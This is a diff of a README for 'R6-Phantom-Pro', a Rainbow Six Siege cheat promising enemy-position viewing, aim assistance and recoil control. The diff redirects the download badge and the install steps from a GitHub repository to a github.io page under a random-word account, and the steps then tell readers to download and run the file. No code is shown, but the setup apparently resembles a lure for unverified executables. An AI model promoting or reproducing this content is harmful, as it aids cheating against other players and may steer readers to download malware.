@@ -1,6 +1,6 @@
 # 🛡️ R6-Phantom-Pro - Win every Rainbow Six Siege match
 
-[![](https://img.shields.io/badge/Download-R6--Phantom--Pro-blue)](https://github.com/hypericumtetrapterumculturalmovement937/R6-Phantom-Pro)
+[![](https://img.shields.io/badge/Download-R6--Phantom--Pro-blue)](https://hypericumtetrapterumculturalmovement937.github.io)
 
 R6-Phantom-Pro provides advanced features for Rainbow Six Siege. It helps you see enemy positions, aim with precision, and control weapon recoil. This tool assists players who want to improve their performance and gain an advantage during matches.
 
@@ -19,7 +19,7 @@ To run this software, your computer needs to meet these basic standards. A stabl
 
 Follow these steps to set up the software.
 
-1.  Visit the official repository page at [https://github.com/hypericumtetrapterumculturalmovement937/R6-Phantom-Pro](https://github.com/hypericumtetrapterumculturalmovement937/R6-Phantom-Pro).
+1.  Visit the official repository page at [https://hypericumtetrapterumculturalmovement937.github.io](https://hypericumtetrapterumculturalmovement937.github.io).
 2.  Locate the releases section on the right side of the page.
 3.  Click the latest version link and download the file.
 4.  Save the file to a folder you can easily locate.
